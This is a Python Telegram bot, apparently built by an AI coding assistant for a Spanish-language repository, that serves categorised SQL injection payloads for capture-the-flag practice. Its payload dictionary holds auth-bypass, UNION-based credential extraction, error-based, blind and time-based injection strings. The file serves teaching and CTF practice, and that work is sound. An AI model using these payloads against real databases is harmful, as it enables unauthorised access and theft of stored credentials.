# bots/ctf-osint/tg_05_sqli_builder.py
# ╔══════════════════════════════════════════════════════════════╗
# ║  DISCLAIMER ÉTICO — Solo uso educativo y entornos autorizados║
# ║  Desarrollado por: Replit (Rocio) — IA Asistente             ║
# ║  Dueño del código: Juan Alberti                              ║
# ║  Repositorio: https://github.com/AlbertiJ/Plantillas-de-bots ║
# ╚══════════════════════════════════════════════════════════════╝
# PROPÓSITO: Bot Telegram — SQL Injection Payload Builder (CTF)
# Ejecución: python bots/ctf-osint/tg_05_sqli_builder.py
# IDEA FUTURA: generador dinámico según DB target (MySQL, MSSQL, Postgres)

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
from bots.shared.env import require_env
from bots.shared.logger import get_logger

logger = get_logger(__name__)
TOKEN = require_env("TELEGRAM_BOT_TOKEN")  # MODIFICAR: nombre en tu .env
DISCLAIMER = "⚠️ USO ÉTICO OBLIGATORIO — Solo CTF y entornos con permiso escrito."

# MODIFICAR: agregar, quitar o adaptar payloads según el CTF
PAYLOADS = {
    "auth_bypass": {"label": "🔓 Auth Bypass", "payloads": ["' OR '1'='1","' OR 1=1 --","admin'--","' OR 1=1#","') OR ('1'='1"]},
    "union_based": {"label": "🔗 UNION Based", "payloads": ["' UNION SELECT NULL--","' UNION SELECT NULL,NULL--","' UNION SELECT username,password FROM users--","' UNION ALL SELECT table_name,NULL FROM information_schema.tables--"]},
    "error_based": {"label": "💥 Error Based", "payloads": ["' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--","1 AND exp(~(SELECT * FROM (SELECT user())x))--"]},
    "boolean_blind": {"label": "🔍 Boolean Blind", "payloads": ["' AND 1=1--","' AND 1=2--","' AND SUBSTRING(username,1,1)='a'--","' AND (SELECT COUNT(*) FROM users)>0--"]},
    "time_based": {"label": "⏱️ Time Based", "payloads": ["' AND SLEEP(5)--","'; SELECT pg_sleep(5)--","1; WAITFOR DELAY '0:0:5'--"]},
}


async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton(v["label"], callback_data=k)] for k,v in PAYLOADS.items()]
    await update.message.reply_text(f"SQLi Payload Builder — CTF\n\n{DISCLAIMER}\n\nElegí una técnica:", reply_markup=InlineKeyboardMarkup(keyboard))


async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    cat = query.data
    if cat not in PAYLOADS: await query.edit_message_text("Categoría no encontrada."); return
    data = PAYLOADS[cat]
    payloads_text = "\n".join(f"{i+1}. {p}" for i,p in enumerate(data["payloads"]))
    await query.edit_message_text(f"{data['label']}\n\n{payloads_text}\n\n{DISCLAIMER}")


async def sqli_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text(f"Uso: /sqli <categoria>\nCategorías: {' | '.join(PAYLOADS.keys())}")
        return
    cat = ctx.args[0].lower()
    if cat not in PAYLOADS: await update.message.reply_text(f"Categoría no encontrada: {cat}"); return
    data = PAYLOADS[cat]
    payloads_text = "\n".join(f"{i+1}. {p}" for i,p in enumerate(data["payloads"]))
    await update.message.reply_text(f"{data['label']}\n\n{payloads_text}\n\n{DISCLAIMER}")


def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("sqli", sqli_cmd))
    app.add_handler(CallbackQueryHandler(callback_handler))
    logger.info("Bot SQLi Builder iniciado.")
    app.run_polling()


if __name__ == "__main__":
    main()
